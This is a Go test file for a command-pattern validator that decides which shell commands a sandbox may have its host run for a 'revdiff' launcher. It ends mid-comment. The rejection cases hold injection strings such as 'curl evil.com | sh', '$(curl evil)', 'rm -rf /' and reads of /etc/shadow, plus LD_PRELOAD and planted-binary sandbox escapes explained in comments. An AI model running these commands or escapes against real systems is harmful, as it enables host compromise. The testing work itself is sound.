package cmdpattern

import (
	"os"
	"path/filepath"
	"testing"
)

func TestMatchAny(t *testing.T) {
	m := MatchAny()
	if !m(nil) {
		t.Error("MatchAny(nil) should be true")
	}
	if !m([]string{"a", "b"}) {
		t.Error("MatchAny(args) should be true")
	}
}

func TestMatchPrefix(t *testing.T) {
	m := MatchPrefix("--type=overlay")
	if !m([]string{"--type=overlay", "echo", "hi"}) {
		t.Error("expected match for prefix")
	}
	if m([]string{"echo", "hi"}) {
		t.Error("expected no match when prefix absent")
	}
	if m(nil) {
		t.Error("expected no match for empty args with non-empty prefix")
	}
}

func TestMatchShellExec_AcceptsRevdiffViaSh(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "revdiff a b"},
		{"-c", "exec revdiff a b"},
		{"-c", "  exec   revdiff --staged"},
	}
	for _, args := range cases {
		t.Run(args[1], func(t *testing.T) {
			if !m(args) {
				t.Errorf("expected match for %q", args)
			}
		})
	}
}

func TestMatchShellExec_RejectsOther(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "curl evil.com | sh"},
		{"-c", "echo revdiff"}, // text mentions revdiff but argv[0] is echo
		{"-c", "rm -rf /"},
		{"echo", "revdiff"}, // not -c form
		nil,
	}
	for _, args := range cases {
		t.Run("reject", func(t *testing.T) {
			if m(args) {
				t.Errorf("expected no match for %v", args)
			}
		})
	}
}

// TestMatchShellExec_RejectsShellMetacharacters covers the case where the first
// token legitimately matches the inner program but the rest of the script
// contains shell operators that would execute additional commands. Without
// shellMeta filtering, a MatchAny inner matcher silently accepts these.
func TestMatchShellExec_RejectsShellMetacharacters(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	bypasses := []string{
		"revdiff && rm -rf /",
		"revdiff; curl evil | sh",
		"revdiff | tee /etc/passwd",
		"revdiff || whoami",
		"revdiff `curl evil`",
		"revdiff $(curl evil)",
		"revdiff > /etc/passwd",
		"revdiff < /etc/shadow",
		"revdiff * ?",
		"revdiff \necho pwned",
		"revdiff \\`echo pwned\\`",
	}
	for _, script := range bypasses {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("bypass: matcher accepted %q", script)
			}
		})
	}
}

// testSentinelRoot stands in for the shared temp directory the production
// callers derive from SharedTmpPath. Every accepted sentinel below lives under
// it; see TestSentinel_ConfinedToRoot for what happens when one does not.
const testSentinelRoot = "/tmp"

// testBounds is the LaunchBounds the matchers below are built with. The project
// directory is left empty: the tests that care about it set their own, and the
// rest must not depend on where the test binary happens to run.
func testBounds() LaunchBounds { return LaunchBounds{SharedTmp: testSentinelRoot} }

// syntheticSharedTmp and syntheticProjectDir are bounds for the tests that plant
// a file in a temp directory. Nothing resolves them, so neither has to exist -
// and unlike testSentinelRoot they cannot swallow the planted path, which
// t.TempDir() puts under /tmp whenever TMPDIR is unset. A bound covering the
// plant by accident turns the "outside every bound" counterweights into
// rejections that look like the rule working.
const (
	syntheticSharedTmp  = "/run/devsandbox-shared"
	syntheticProjectDir = "/run/devsandbox-project"
)

// plantEditorOnPath writes an executable named name into a project-local bin
// directory and puts that directory first on PATH - the virtualenv, direnv or
// mise bin every real project has, and the reason a bare program name is not by
// itself host-derived. It returns the project directory.
func plantEditorOnPath(t *testing.T, name string) string {
	t.Helper()

	projectDir := t.TempDir()
	binDir := filepath.Join(projectDir, ".venv", "bin")
	if err := os.MkdirAll(binDir, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(binDir, name), []byte("#!/bin/sh\n"), 0o700); err != nil {
		t.Fatalf("plant editor: %v", err)
	}
	t.Setenv("PATH", binDir+string(os.PathListSeparator)+os.Getenv("PATH"))
	return projectDir
}

// TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape exercises the exact
// form revdiff's kitty launcher produces: single-quoted argv followed by
// "; touch '<sentinel-path>'".
// Each case carries the ResolvedBin the inner pattern would hold in production,
// because argv[0] is matched exactly: an absolute path is accepted only when it
// is the pinned one, and the bare spelling only when nothing is pinned.
func TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape(t *testing.T) {
	cases := []struct{ bin, script string }{
		{"/usr/local/bin/revdiff", `'/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc' '--staged'; touch '/tmp/revdiff-done-xyz'`},
		{"", `'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`},
		{"/home/user/.local/bin/revdiff", `'/home/user/.local/bin/revdiff' '--output=/tmp/out' 'HEAD~1'; touch '/tmp/revdiff-done-2'`},
	}
	for _, tc := range cases {
		t.Run(tc.script, func(t *testing.T) {
			m := MatchShellExecSentinel(CommandPattern{Program: "revdiff", ResolvedBin: tc.bin, ArgsMatcher: MatchAny()}, testBounds())
			if !m([]string{"-c", tc.script}) {
				t.Errorf("expected accept for %q", tc.script)
			}
		})
	}
}

func TestMatchShellExecSentinel_RejectsAttacks(t *testing.T) {
	// Pinned to the path the cases below use, so each rejection is decided by
	// the script grammar rather than incidentally by the program pin.
	inner := CommandPattern{Program: "revdiff", ResolvedBin: "/bin/revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecSentinel(inner, testBounds())

	rejects := []string{
		// No sentinel suffix at all.
		`'/bin/revdiff' '--staged'`,
		// Wrong tail program (not touch).
		`'/bin/revdiff'; rm '/etc/passwd'`,
		// Extra command injected before the sentinel.
		`'/bin/revdiff'; curl evil; touch '/tmp/revdiff-done-x'`,
		// Command injection inside a quoted arg via backslash-escape — rejected
		// because backslash is banned inside quotes.
		`'/bin/revdiff\nrm -rf /'; touch '/tmp/revdiff-done-x'`,
		// Unquoted args.
		`revdiff --staged; touch /tmp/revdiff-done-x`,
		// Double quotes (not accepted — wrong quote style).
		`"revdiff" "--staged"; touch "/tmp/revdiff-done-x"`,
		// Sentinel path contains ".."
		`'/bin/revdiff'; touch '/tmp/../etc/passwd'`,
		// Sentinel path has a space.
		`'/bin/revdiff'; touch '/tmp/revdiff done'`,
		// Sentinel path has shell meta.
		`'/bin/revdiff'; touch '/tmp/$(whoami)'`,
		// Two touches — extra shell work.
		`'/bin/revdiff'; touch '/tmp/a'; touch '/tmp/b'`,
		// Pipe in first half.
		`'/bin/revdiff' | 'curl'; touch '/tmp/x'`,
		// Inner program does not match.
		`'/bin/curl' 'evil.com'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape exercises
// the revdiff launcher shape introduced in v0.8.0: when EDITOR or VISUAL are
// set on the caller's shell, the launcher prepends `/usr/bin/env KEY=VAL ...`
// so the kitty-spawned overlay inherits the intended editor.
func TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape(t *testing.T) {
	cases := []struct{ bin, script string }{
		{"/usr/local/bin/revdiff", `'/usr/bin/env' 'EDITOR=nvim' 'VISUAL=nvim' '/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'`},
		{"", `'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`},
		// env prefix with no KEY=VAL pairs is still accepted — the revdiff
		// launcher always uses `env` when ENV_PREFIX is non-empty, but a future
		// version could collapse to `env revdiff ...`. Accepting this costs
		// nothing and keeps the matcher robust.
		{"", `'/usr/bin/env' 'revdiff' '--staged'; touch '/tmp/revdiff-done-3'`},
		// Actual launcher output (v0.8.0+): `/usr/bin/env` is left unquoted
		// while every subsequent token is single-quoted. Must match.
		{"/usr/local/bin/revdiff", `/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' '/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'`},
		{"", `/usr/bin/env 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-4'`},
		{"", `/usr/bin/env 'revdiff' '--staged'; touch '/tmp/revdiff-done-5'`},
	}
	for _, tc := range cases {
		t.Run(tc.script, func(t *testing.T) {
			m := MatchShellExecEnvSentinel(CommandPattern{Program: "revdiff", ResolvedBin: tc.bin, ArgsMatcher: MatchAny()}, testBounds())
			if !m([]string{"-c", tc.script}) {
				t.Errorf("expected accept for %q", tc.script)
			}
		})
	}
}

func TestMatchShellExecEnvSentinel_RejectsAttacks(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	rejects := []string{
		// First token is not env.
		`'/bin/sh' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// env wrapping a non-revdiff program.
		`'/usr/bin/env' 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-x'`,
		// Only env + KEY=VAL, no inner program.
		`'/usr/bin/env' 'EDITOR=nvim'; touch '/tmp/revdiff-done-x'`,
		// Just env with nothing else.
		`'/usr/bin/env'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (lowercase).
		`'/usr/bin/env' 'editor=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (starts with digit).
		`'/usr/bin/env' '1FOO=bar' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Quoted `env` with no path: resolved against PATH, which is exactly
		// what basename matching used to let through.
		`'env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-2'`,
		// KEY=VAL with shell metacharacter in value (rejected by the
		// parseSingleQuotedArgv byte filter — backslash banned).
		`'/usr/bin/env' 'EDITOR=nvim\nevil' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Missing sentinel tail.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'`,
		// Extra command appended after sentinel.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/a'; curl evil`,
		// Sentinel has ".." segment.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/../etc/passwd'`,
		// env prefix followed by a wrapping sh (nested shell).
		`'/usr/bin/env' 'EDITOR=nvim' 'sh' '-c' 'revdiff'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: only the literal `/usr/bin/env ` prefix is
		// accepted. Bare `env` (PATH-relative) must be rejected so attackers
		// can't shadow `env` via $PATH.
		`env 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: a non-env absolute path must be rejected.
		`/bin/curl 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: /usr/bin/env wrapping a non-revdiff inner program
		// must still be rejected.
		`/usr/bin/env 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: symlink-like path ending in /env must be rejected —
		// the prefix check is exact, not basename-matched.
		`/tmp/evil/env 'EDITOR=nvim' 'revdiff'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// sharedTmpEditor is a path shaped like one inside the host↔sandbox shared temp
// directory — bind-mounted read-write at an identical path on both sides, so a
// binary the sandbox drops there is a binary the host would execute.
//
// The basename is a real editor name on purpose. With something like "evil" the
// name allowlist refuses the value before the path comparison runs, so the test
// would stay green with that comparison deleted — and the path comparison is
// the only thing standing between the sandbox and a binary it wrote.
const sharedTmpEditor = "/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/nvim"

// sharedTmpTraversal reaches the same directory through a `..` that cleans away.
// filepath.Clean collapses it lexically; the kernel expands the symlink first,
// so a validator comparing the cleaned spelling approves one path and the host
// runs another.
const sharedTmpTraversal = "/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/link/../../../../../../usr/bin/nvim"

// TestMatchShellExecEnvSentinel_RejectsEnvValues covers the mechanism the key
// allowlist alone does not: EDITOR is a variable the launcher exists to
// forward, and revdiff spawns whatever it names. The execution comes from the
// value, so a value the sandbox picked is the defect even when the key is one
// the launcher legitimately emits.
func TestMatchShellExecEnvSentinel_RejectsEnvValues(t *testing.T) {
	// Pinned, because editorNameAllowed reads the process environment: without
	// this the outcome of a negative security test depends on the runner's own
	// EDITOR, and a machine exporting one of these values would flip it.
	t.Setenv("EDITOR", "nvim")
	t.Setenv("VISUAL", "")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	tests := []struct {
		name   string
		assign string
	}{
		{"editor in the shared temp directory", "EDITOR=" + sharedTmpEditor},
		{"visual in the shared temp directory", "VISUAL=" + sharedTmpEditor},
		{"editor reaching the shared temp directory through ..", "EDITOR=" + sharedTmpTraversal},
		{"editor as a relative path", "EDITOR=./evil"},
		{"editor as a bare relative path with a separator", "EDITOR=sub/evil"},
		{"editor at an absolute path PATH does not yield", "EDITOR=/opt/planted/nvim"},
		{"editor carrying a value-bearing argument", "EDITOR=nvim --cmd source"},
		{"editor carrying a path argument", "EDITOR=nvim /tmp/x"},
		{"editor with a tilde the shell would expand", "EDITOR=~/evil"},
		{"loader variable", "LD_PRELOAD=/tmp/x.so"},
		{"bash startup file", "BASH_ENV=/tmp/x.sh"},
		{"python startup file", "PYTHONSTARTUP=/tmp/x.py"},
		{"perl options", "PERL5OPT=-Mevil"},
		{"path itself", "PATH=/tmp/evil"},
		{"inert flag carrying a path", "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=/tmp/evil"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			script := `/usr/bin/env '` + tt.assign + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsHostResolvedEditorPath is the
// counterweight: an absolute EDITOR naming a path the host's own PATH lookup
// yields is the legitimate case and must survive. The host's own setting is
// what makes an editor outside the built-in list acceptable, so it stands in
// for one here - no particular editor is installed on every test machine.
func TestMatchShellExecEnvSentinel_AcceptsHostResolvedEditorPath(t *testing.T) {
	bin, err := ResolveProgram("sh")
	if err != nil {
		t.Skipf("sh not resolvable on this host: %v", err)
	}
	t.Setenv("EDITOR", bin)
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	for _, assign := range []string{
		"EDITOR=" + bin,
		"EDITOR=nvim",
		// An editor that detaches needs a flag to block, and the launcher
		// forwards the caller's value verbatim - so the stock `code --wait`
		// and `subl -w` spellings have to survive or every launch on such a
		// host is denied.
		"EDITOR=code --wait",
		"EDITOR=subl -w",
		// Set-but-empty is what the launcher emits when the caller exported
		// the name with no value.
		"EDITOR=",
	} {
		script := `/usr/bin/env '` + assign + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
		if !m([]string{"-c", script}) {
			t.Errorf("expected accept for %q", script)
		}
	}
}

// TestMatchShellExecEnvSentinel_RejectsInterpreterEditor covers the gap the
// PATH resolution alone leaves: the host runs `$EDITOR <file>` on a file in the
// project tree, which is bind-mounted read-write, so an interpreter turns that
// file into the program. Resolving the name only decides which host binary
// opens the sandbox's file, not whether it executes it.
func TestMatchShellExecEnvSentinel_RejectsInterpreterEditor(t *testing.T) {
	// A host EDITOR of its own must not widen the check for other names.
	t.Setenv("EDITOR", "nvim")
	t.Setenv("VISUAL", "")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	for _, value := range []string{"sh", "bash", "python3", "perl", "awk", "node", "env", "xargs"} {
		script := `/usr/bin/env 'EDITOR=` + value + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
		if m([]string{"-c", script}) {
			t.Errorf("expected reject for EDITOR=%s", value)
		}
	}
}

// TestMatchShellExecEnvSentinel_RejectsSymlinkedEditorPath pins the swap
// window: resolving the sandbox's own path first accepts a symlink pointed at
// the real editor, and the sandbox repoints it before the host execs. Both
// accepted paths are derived on the host, so a path under a directory the
// sandbox writes through is refused whatever it currently points at.
func TestMatchShellExecEnvSentinel_RejectsSymlinkedEditorPath(t *testing.T) {
	bin, err := ResolveProgram("sh")
	if err != nil {
		t.Skipf("sh not resolvable on this host: %v", err)
	}
	t.Setenv("EDITOR", bin)

	planted := filepath.Join(t.TempDir(), filepath.Base(bin))
	if err := os.Symlink(bin, planted); err != nil {
		t.Fatalf("plant symlink: %v", err)
	}

	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())
	script := `/usr/bin/env 'EDITOR=` + planted + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
	if m([]string{"-c", script}) {
		t.Errorf("accepted a sandbox-writable symlink to the real editor: %s", planted)
	}
}

// TestMatchShellExecEnvSentinel_RejectsPlantedEnvBinary covers the quoted form
// of the env program. The unquoted form was already pinned to an absolute path;
// the quoted one matched on basename, so any path ending in `/env` was accepted
// — including one under a directory the sandbox writes through to the host.
func TestMatchShellExecEnvSentinel_RejectsPlantedEnvBinary(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	for _, prog := range []string{
		"/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/env",
		"/tmp/evil/env",
		"env",
		"./env",
	} {
		script := `'` + prog + `' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
		if m([]string{"-c", script}) {
			t.Errorf("expected reject for %q", script)
		}
	}
}

// TestMatchShellExecEnvSentinel_RejectsEditorResolvedFromProjectDir covers the
// case a bare name alone does not: "the host resolves it against its own PATH"
// is an anchor only while that PATH stays out of the directories the sandbox
// writes. A project-local bin directory - a virtualenv, node_modules, a `bin`
// direnv or mise adds - is on PATH in exactly the shell a terminal is launched
// from, and the project tree is bind-mounted read-write, so the sandbox plants
// the binary and names it by the bare name the allowlist already accepts.
func TestMatchShellExecEnvSentinel_RejectsEditorResolvedFromProjectDir(t *testing.T) {
	t.Setenv("EDITOR", "")
	t.Setenv("VISUAL", "")

	projectDir := plantEditorOnPath(t, "nvim")

	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	script := `/usr/bin/env 'EDITOR=nvim' 'revdiff' '--staged'; touch '` + syntheticSharedTmp + `/revdiff-done-x'`

	bounded := MatchShellExecEnvSentinel(inner, LaunchBounds{SharedTmp: syntheticSharedTmp, ProjectDir: projectDir})
	if bounded([]string{"-c", script}) {
		t.Error("accepted EDITOR=nvim while the host's PATH resolves nvim inside the project tree")
	}

	// The same name with the planted directory outside the bounds is the
	// ordinary case and must still be accepted, or every launch on a host
	// without that editor installed would be denied.
	unbounded := MatchShellExecEnvSentinel(inner, LaunchBounds{SharedTmp: syntheticSharedTmp, ProjectDir: syntheticProjectDir})
	if !unbounded([]string{"-c", script}) {
		t.Error("rejected EDITOR=nvim resolving outside every bound")
	}
}

// TestMatchShellExecEnvSentinel_RejectsHostEditorResolvedFromProjectDir covers
// the one escape hatch the check above has: a value byte-identical to the host's
// own EDITOR or VISUAL. "The setting the host would have run anyway" is only an
// anchor while the name in it resolves outside every directory the sandbox
// writes - `EDITOR=nvim` names a file, and which file is decided by a PATH that
// reaches into the project tree.
func TestMatchShellExecEnvSentinel_RejectsHostEditorResolvedFromProjectDir(t *testing.T) {
	projectDir := plantEditorOnPath(t, "nvim")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	bounded := MatchShellExecEnvSentinel(inner, LaunchBounds{SharedTmp: syntheticSharedTmp, ProjectDir: projectDir})

	for _, tc := range []struct{ name, value string }{
		{"bare name", "nvim"},
		// The flags ride on the host match, so a host value carrying them must
		// not carry the program word past the check either.
		{"name with flags", "nvim -R"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			for _, hostVar := range []string{"EDITOR", "VISUAL"} {
				t.Setenv("EDITOR", "")
				t.Setenv("VISUAL", "")
				t.Setenv(hostVar, tc.value)

				script := `/usr/bin/env 'EDITOR=` + tc.value + `' 'revdiff' '--staged'; touch '` + syntheticSharedTmp + `/revdiff-done-x'`
				if bounded([]string{"-c", script}) {
					t.Errorf("accepted the host's own %s=%q while the host's PATH resolves it inside the project tree", hostVar, tc.value)
				}
			}
		})
	}

	// Same host setting, planted directory outside every bound: the hatch exists
	// for this case and must keep working.
	t.Setenv("EDITOR", "nvim -R")
	t.Setenv("VISUAL", "")
	unbounded := MatchShellExecEnvSentinel(inner, LaunchBounds{SharedTmp: syntheticSharedTmp, ProjectDir: syntheticProjectDir})
	script := `/usr/bin/env 'EDITOR=nvim -R' 'revdiff' '--staged'; touch '` + syntheticSharedTmp + `/revdiff-done-x'`
	if !unbounded([]string{"-c", script}) {
		t.Error("rejected the host's own EDITOR resolving outside every bound")
	}
}

// TestMatchShellExecEnvSentinel_RejectsEnvBinaryUnderABound pins the same rule
// for the `env` program: envBins holds what the host's own lookup produced,
// which stops being host-derived once that lookup reaches a directory the
// sandbox writes.
func TestMatchShellExecEnvSentinel_RejectsEnvBinaryUnderABound(t *testing.T) {
	t.Setenv("EDITOR", "")
	t.Setenv("VISUAL", "")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}

	// The assignment is set-but-empty, so it names nothing and the rejection can
	// only be the env binary. `EDITOR=<some editor>` decided the unquoted case by
	// accident on any host with that editor in /usr/bin, which left the unquoted
	// prefix - the form the launcher actually emits - untested against the bound.
	const (
		unquoted = `/usr/bin/env 'EDITOR=' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
		quoted   = `'/usr/bin/env' 'EDITOR=' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
	)

	// Stands in for a PATH that reaches into the project: the bound is set to
	// the directory the accepted `env` actually lives in.
	bounded := MatchShellExecEnvSentinel(inner, LaunchBounds{
		SharedTmp:  testSentinelRoot,
		ProjectDir: "/usr/bin",
	})
	for _, script := range []string{unquoted, quoted} {
		if bounded([]string{"-c", script}) {
			t.Errorf("accepted an env binary inside a bound the sandbox can write: %q", script)
		}
	}

	// The counterweight: the same two forms with /usr/bin outside every bound are
	// the ordinary launcher shape and must survive.
	unbounded := MatchShellExecEnvSentinel(inner, LaunchBounds{
		SharedTmp:  testSentinelRoot,
		ProjectDir: syntheticProjectDir,
	})
	for _, script := range []string{unquoted, quoted} {
		if !unbounded([]string{"-c", script}) {
			t.Errorf("rejected the launcher's own env prefix outside every bound: %q", script)
		}
	}
}

func TestPatternMatchesArgv(t *testing.T) {
	p := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	if !p.MatchesArgv([]string{"revdiff", "a", "b"}) {
		t.Error("expected program-only match")
	}
	if p.MatchesArgv([]string{"/usr/local/bin/revdiff", "a"}) {
		t.Error("a path whose basename matches Program must not match")
	}
	if p.MatchesArgv([]string{"revdiffx", "a"}) {
		t.Error("unrelated program should not match")
	}
	if p.MatchesArgv(nil) {
		t.Error("empty argv should not match")
	}
}

func TestCommandPatternResolvedBinPinsExactPath(t *testing.T) {
	const real = "/usr/local/bin/revdiff"

	p := CommandPattern{Program: "revdiff", ResolvedBin: real, ArgsMatcher: MatchAny()}

	tests := []struct {
		name string
		arg0 string
		want bool
	}{
		{"exact resolved path accepted", real, true},
		// Not merely cosmetic: filepath.Clean collapses `..` lexically while
		// the kernel expands each symlink on the way, so accepting a spelling
		// that needs cleaning is accepting a path that resolves elsewhere. The
		// `..` case below is the one that mattered - the shared temp directory
		// is bind-mounted at an identical path on both sides, so a symlink the
		// sandbox plants there redirects everything after it while the cleaned
		// form still reads as the pinned binary.
		{"uncleaned form of the same path rejected", "/usr/local/bin/./revdiff", false},
		{"traversal that cleans to the resolved path rejected",
			"/home/u/.cache/devsandbox/tmp/a1b2c3/link/../../../../../../usr/local/bin/revdiff", false},
		{"same basename elsewhere rejected", "/home/zekker/.cache/devsandbox/revdiff-ipc/abc/revdiff", false},
		{"same basename in tmp rejected", "/tmp/revdiff", false},
		{"bare name rejected (host PATH lookup could land anywhere)", "revdiff", false},
		{"different basename at allowed dir rejected", "/usr/local/bin/evil", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := p.MatchesArgv([]string{tt.arg0, "--output=/tmp/o"}); got != tt.want {
				t.Errorf("MatchesArgv(%q) = %v, want %v", tt.arg0, got, tt.want)
			}
		})
	}
}

// TestIsCanonicalPath covers the guard every "pinned to its resolved path" rule
// in this package now rests on. filepath.Clean collapses `..` textually while
// the kernel expands each symlink first, so a spelling that needs cleaning can
// name one file to the validator and another to execve.
func TestIsCanonicalPath(t *testing.T) {
	canonical := []string{"/usr/bin/nano", "sh", "revdiff", "/a/bc/revdiff"}
	for _, p := range canonical {
		if !IsCanonicalPath(p) {
			t.Errorf("IsCanonicalPath(%q) = false, want true", p)
		}
	}
	notCanonical := []string{
		"",
		"/usr/bin/./nano",
		"/usr//bin/nano",
		"/usr/bin/nano/",
		"/home/u/.cache/devsandbox/tmp/abc/link/../../../../usr/bin/nano",
	}
	for _, p := range notCanonical {
		if IsCanonicalPath(p) {
			t.Errorf("IsCanonicalPath(%q) = true, want false", p)
		}
	}

	// A leading `..` on a *relative* path survives Clean, so it is canonical by
	// this test alone. It is refused where it matters by the callers, which
	// each require an absolute path before comparing.
	if !IsCanonicalPath("../nano") {
		t.Error(`IsCanonicalPath("../nano") = false, want true (Clean leaves a leading ..)`)
	}
	if envProgramValueAllowed("../nano", testBounds()) {
		t.Error("envProgramValueAllowed accepted a relative path")
	}
	p := CommandPattern{Program: "nano", ResolvedBin: "/usr/bin/nano", ArgsMatcher: MatchAny()}
	if p.MatchesArgv([]string{"../nano"}) {
		t.Error("MatchesArgv accepted a relative path against a pinned absolute one")
	}
}

// TestCommandPatternNoBasenameFallback pins the absence of basename matching.
// It used to be the behavior for any pattern with no ResolvedBin, and it let a
// sandbox satisfy the pattern with its own binary: the shared temp directory
// and the revdiff IPC directory are bind-mounted read-write at an *identical*
// path on host and sandbox, so `<shared tmp>/sh` is a path the sandbox writes
// and the host then executes. argv[0] now has to be a spelling the host itself
// resolves.
func TestCommandPatternNoBasenameFallback(t *testing.T) {
	p := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}

	if !p.MatchesArgv([]string{"revdiff"}) {
		t.Error(`MatchesArgv("revdiff") = false, want true (exact Program match)`)
	}
	for _, arg0 := range []string{
		"/usr/bin/revdiff",
		"/anywhere/at/all/revdiff",
		"/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/revdiff",
		"./revdiff",
		"/usr/bin/other",
	} {
		if p.MatchesArgv([]string{arg0}) {
			t.Errorf("MatchesArgv(%q) = true, want false", arg0)
		}
	}
}

// TestCommandPatternShellSpellings covers how the revdiff kitty patterns pin
// the wrapping shell: by spelling, since a shell has no single resolved path
// worth pinning. Only what the host resolves itself is accepted.
func TestCommandPatternShellSpellings(t *testing.T) {
	for _, spelling := range []string{"sh", "/bin/sh"} {
		p := CommandPattern{Program: spelling, ArgsMatcher: MatchAny()}
		if !p.MatchesArgv([]string{spelling, "-c", "true"}) {
			t.Errorf("MatchesArgv(%q) = false, want true", spelling)
		}
		for _, planted := range []string{
			"/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/sh",
			"/tmp/evil/sh",
			"./sh",
		} {
			if p.MatchesArgv([]string{planted, "-c", "true"}) {
				t.Errorf("pattern %q accepted sandbox-plantable %q, want rejected", spelling, planted)
			}
		}
	}
}

// TestMatchShellExecSentinel_RejectsConcatenatedQuotedTokens pins the rule
// tokenizeScriptHead already had and this parser did not: `'a”b'` is two
// tokens to a naive scan and one word to the shell, so the argv that was
// validated is not the argv that runs.
func TestMatchShellExecSentinel_RejectsConcatenatedQuotedTokens(t *testing.T) {
	inner := CommandPattern{Program: "/usr/local/bin/revdiff", ResolvedBin: "/usr/local/bin/revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecSentinel(inner, testBounds())

	script := `'/usr/local/bin/revdiff''EXTRA' '--staged'; touch '/tmp/revdiff-done-x'`
	if m([]string{"-c", script}) {
		t.Errorf("accepted %q, where the shell builds the single word /usr/local/bin/revdiffEXTRA", script)
	}

	// The separated spelling is the legitimate one and must still pass.
	ok := `'/usr/local/bin/revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
	if !m([]string{"-c", ok}) {
		t.Errorf("rejected the legitimate form %q", ok)
	}
}

func TestResolveProgram(t *testing.T) {
	// `go` is on PATH in any environment that can run this test.
	got, err := ResolveProgram("go")
	if err != nil {
		t.Fatalf("ResolveProgram(go) returned error: %v", err)
	}
	if !filepath.IsAbs(got) {
		t.Errorf("ResolveProgram(go) = %q, want an absolute path", got)
	}
	if filepath.Base(got) != "go" {
		t.Errorf("ResolveProgram(go) = %q, want basename %q", got, "go")
	}

	if _, err := ResolveProgram("definitely-not-a-real-binary-xyzzy"); err == nil {
		t.Error("ResolveProgram(nonexistent) returned nil error, want failure so the pattern denies rather than widens")
	}
}

// TestSentinel_ConfinedToRoot pins the bound the shape test alone did not
// carry. The clause the launcher appends is not a `touch` in the herdr form but
//
